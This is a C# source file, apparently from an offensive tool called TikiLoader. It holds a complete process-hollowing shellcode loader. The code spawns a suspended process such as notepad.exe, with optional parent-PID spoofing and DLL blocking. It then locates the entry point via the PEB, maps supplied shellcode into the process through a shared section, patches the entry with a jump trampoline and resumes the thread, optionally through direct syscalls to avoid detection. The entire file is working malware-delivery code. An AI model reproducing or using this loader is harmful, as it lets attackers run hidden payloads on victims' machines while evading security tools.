using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TikiLoader
{
    public class Hollower
    {
        public string BinaryPath { get; set; } = "C:\\Windows\\System32\\notepad.exe";
        public string WorkingDirectory { get; set; } = "C:\\Windows\\System32";
        public int ParentId { get; set; } = 0;
        public bool BlockDlls { get; set; } = false;

        private bool _syscalls;

        private IntPtr _section;
        private IntPtr _localMap;
        private IntPtr _remoteMap;
        private IntPtr _pModBase;
        private IntPtr _pEntry;
        private ulong _size;

        private readonly IntPtr _inner;

        public Hollower()
        {
            _inner = Marshal.AllocHGlobal(512);
        }
        
        public void Hollow(byte[] shellcode, bool useSyscalls = false)
        {
            _syscalls = useSyscalls;
            
            var pi = Utilities.SpawnProcess(
                BinaryPath,
                WorkingDirectory,
                BlockDlls,
                ParentId,
                true);
            
            FindEntry(pi.hProcess);
            GetEntry();
            CreateSection((uint)shellcode.Length);
            SetLocalSection();
            CopyShellcode(shellcode);
            MapAndStart(pi);
            CloseHandles(pi);
        }
        
        private void FindEntry(IntPtr hProcess)
        {
            var pbi = Native.NtQueryInformationProcessBasicInformation(hProcess);

            IntPtr pointer;
            
            if (Utilities.Is64Bit)
                pointer = (IntPtr)((long)pbi.PebBaseAddress + 16);
            else
                pointer = (IntPtr)((int)pbi.PebBaseAddress + 8);

            var buf = Marshal.AllocHGlobal(IntPtr.Size);
            var toRead = (uint)IntPtr.Size;
            
            Native.NtReadVirtualMemory(
                hProcess,
                pointer,
                buf,
                ref toRead);

            _pModBase = Marshal.ReadIntPtr(buf);
            Marshal.FreeHGlobal(buf);
            
            toRead = 512;
            Native.NtReadVirtualMemory(
                hProcess,
                _pModBase,
                _inner,
                ref toRead);
        }
        
        private void GetEntry()
        {
            var buf = new byte[512];
            Marshal.Copy(_inner, buf, 0, 512);

            IntPtr res;

            unsafe
            {
                fixed (byte* p = buf)
                {
                    var e_lfanew_offset = *(uint*)(p + 0x3C);
                    var nthdr = p + e_lfanew_offset;
                    var opthdr = nthdr + 0x18;
                    var entry_ptr = opthdr + 0x10;
                    var tmp = *(int*)entry_ptr;

                    if (Utilities.Is64Bit)
                        res = (IntPtr)(_pModBase.ToInt64() + tmp);
                    else
                        res = (IntPtr)(_pModBase.ToInt32() + tmp);
                }
            }

            _pEntry = res;
        }
        
        private void CreateSection(uint size)
        {
            _size = size;

            if (_syscalls)
            {
                Syscall.NtCreateSection(
                    ref _section,
                    (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
                    IntPtr.Zero,
                    ref _size,
                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                    Data.Win32.WinNT.SEC_COMMIT,
                    IntPtr.Zero);
            }
            else
            {
                Native.NtCreateSection(
                    ref _section,
                    (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
                    IntPtr.Zero,
                    ref _size,
                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                    Data.Win32.WinNT.SEC_COMMIT,
                    IntPtr.Zero);
            }
        }
        
        private void SetLocalSection()
        {
            using var self = Process.GetCurrentProcess();
            
            _localMap = MapSection(
                self.Handle,
                Data.Win32.WinNT.PAGE_READWRITE,
                IntPtr.Zero);
        }
        
        private IntPtr MapSection(IntPtr procHandle, uint protect, IntPtr baseAddress)
        {
            var address = baseAddress;

            if (_syscalls)
            {
                Syscall.NtMapViewOfSection(
                    _section,
                    procHandle,
                    ref address,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref _size,
                    1,
                    0,
                    protect);
            }
            else
            {
                Native.NtMapViewOfSection(
                    _section,
                    procHandle,
                    ref address,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref _size,
                    1,
                    0,
                    protect);
            }

            return address;
        }
        
        private void CopyShellcode(byte[] shellcode)
        {
            Marshal.Copy(shellcode, 0, _localMap, shellcode.Length);
        }

        private (IntPtr Ptr, int Size) BuildEntryPatch()
        {
            var i = 0;

            var dest = _remoteMap;
            var ptr = Marshal.AllocHGlobal((IntPtr)0x10);

            unsafe
            {
                var p = (byte*)ptr;
                byte[] tmp;

                if (Utilities.Is64Bit)
                {
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    var val = (long)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    var val = (int)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (var j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }

            return (ptr, i);
        }

        private void MapAndStart(Data.Win32.Kernel32.PROCESS_INFORMATION pi)
        {
            _remoteMap = MapSection(
                pi.hProcess,
                Data.Win32.WinNT.PAGE_EXECUTE_READ,
                IntPtr.Zero);

            var patch = BuildEntryPatch();
            var pSize = (IntPtr) patch.Size;

            var oldProtect = Native.NtProtectVirtualMemory(
                pi.hProcess,
                ref _pEntry,
                ref pSize,
                Data.Win32.WinNT.PAGE_READWRITE);

            _ = Native.NtWriteVirtualMemory(
                pi.hProcess,
                _pEntry,
                patch.Ptr,
                (uint) patch.Size);

            _ = Native.NtProtectVirtualMemory(
                pi.hProcess,
                ref _pEntry,
                ref pSize,
                oldProtect);

            Marshal.FreeHGlobal(patch.Ptr);

            if (_syscalls)
                Syscall.NtResumeThread(pi.hThread, IntPtr.Zero);
            else
                Native.NtResumeThread(pi.hThread, IntPtr.Zero);
        }

        private static void CloseHandles(Data.Win32.Kernel32.PROCESS_INFORMATION pi)
        {
            Win32.CloseHandle(pi.hThread);
            Win32.CloseHandle(pi.hProcess);
        }

        ~Hollower()
        {
            if (_localMap != IntPtr.Zero)
            {
                if (_syscalls)
                    Syscall.NtUnmapViewOfSection(_section, _localMap);
                else
                    Native.NtUnmapViewOfSection(_section, _localMap);
            }

            Marshal.FreeHGlobal(_inner);
        }
    }
}